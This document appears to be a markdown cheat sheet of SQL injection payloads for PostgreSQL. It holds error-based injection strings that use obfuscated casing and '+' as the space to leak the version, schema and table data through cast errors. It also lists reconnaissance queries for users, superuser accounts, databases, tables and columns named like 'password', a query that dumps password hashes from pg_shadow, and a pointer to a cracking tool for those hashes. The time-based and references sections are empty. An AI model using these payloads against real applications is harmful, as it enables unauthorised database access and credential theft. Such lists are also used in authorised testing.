# PostgresSQL

## PostgreSQL Comments
```
--
/**/ 
--------------------------------------------------
SELECT 1; –comment
SELECT /*comment*/1;
```

## PostgreSQL Error Based - Basic
```
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
```
## PostgreSQL Time Based


# ----------------------------------------------------------

### Version	
``` 
SELECT version()
```
### Comments	
```
SELECT 1; –comment
SELECT /*comment*/1;
```
### Current User	
```
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```
### List Users	
```
SELECT usename FROM pg_user
```
### List Password Hashes
```
SELECT usename, passwd FROM pg_shadow — priv
```
### Password Cracker	
```
MDCrack can crack PostgreSQL’s MD5-based passwords.
```
### List Privileges	
```
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
```
### List DBA Accounts
```
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```
### Current Database	
```
SELECT current_database()
```
### List Databases	
```
SELECT datname FROM pg_database
```
### List Columns	
```
SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)
```
### List Tables	
```
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)
Find Tables From Column Name	If you want to list all the table names that contain a column LIKE ‘%password%’:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’;
```

## References:
